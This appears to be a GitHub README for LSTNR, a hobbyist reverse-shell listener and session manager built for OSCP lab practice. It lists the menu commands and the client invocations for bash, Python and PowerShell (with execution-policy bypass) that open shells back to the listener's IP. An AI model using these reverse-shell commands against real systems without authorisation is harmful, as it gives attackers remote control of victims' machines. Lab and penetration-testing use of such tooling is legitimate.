# LSTNR
Python script that receives shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI).

While running, lstnr.py writes to a log file in the directory it is ran in.

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```
git clone github.com/bwithe/LSNTR

cd lstnr
```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`
- MENU COMMANDS
    - `list-sessions` or `ls` : lists connected clients
    - `connect-session <ID>` or `cs <ID>` : connects to that session
    - `kill-session <ID>` or `ks <ID>` : will terminate a session per id
    - `kill-lstnr` or `exit` : will terminate all sessions and stop the script (currently working out bugs when shutting down)
- SESSION COMMANDS
    - `bg-session` or `bs` : backgrounds the active session
    - `kill-session` or `ks` : while in a session will terminate it

2. Have CLIENT connect to LSTNR
    - Linux / MacOS
      - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
      - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
     
    - Windows
        - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`


# Screenshot examples:

![windows-kali](https://github.com/user-attachments/assets/d3d4bae8-014c-4e3b-bf83-112939eb8250)

![windows-curl](https://github.com/user-attachments/assets/7e52e3f0-0c24-4f8f-a7da-739802ed4170)

# TROUBLESHOOTING
- If you are having issues closing the LSTNR
```
lstnr_pid=$(ps aux | grep lstnr | egrep -v 'grep' | awk '{print $2}')

kill -9 $lstnr_pid
```
